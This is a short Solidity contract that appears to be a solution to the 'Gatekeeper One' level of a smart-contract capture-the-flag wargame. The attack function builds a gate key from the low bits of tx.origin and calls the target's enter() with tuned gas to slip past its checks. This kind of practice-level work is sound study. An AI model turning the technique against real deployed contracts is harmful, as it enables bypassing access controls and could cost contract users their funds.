// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title 13. GATE KEEPER ONE
 * @dev Make it past the gatekeeper and register as an entrant to pass this level.
 */

contract GateSkipperOne {
    address private immutable gateKeeper;

    constructor(address _gateKeeper) {
        gateKeeper = _gateKeeper;
    }

    function attack(uint256 gas) external {
        bytes8 key = _constructGateKey();

        (bool success, ) = gateKeeper.call{gas: 8191 * 20 + gas}( // gas == 256
            abi.encodeWithSignature("enter(bytes8)", key)
        );
        require(success, "Attack failed");
    }

    function _constructGateKey() private view returns (bytes8 gateKey) {
        // Get the last 16 bits of tx.origin
        uint16 ls16BitsTxOrigin = uint16(uint160(tx.origin));
        // Concatenate the last 16 bits with 0x0001000000000000
        gateKey = bytes8(
            uint64(uint64(0x0001000000000000) | uint64(ls16BitsTxOrigin))
        );
        return gateKey;
    }
}
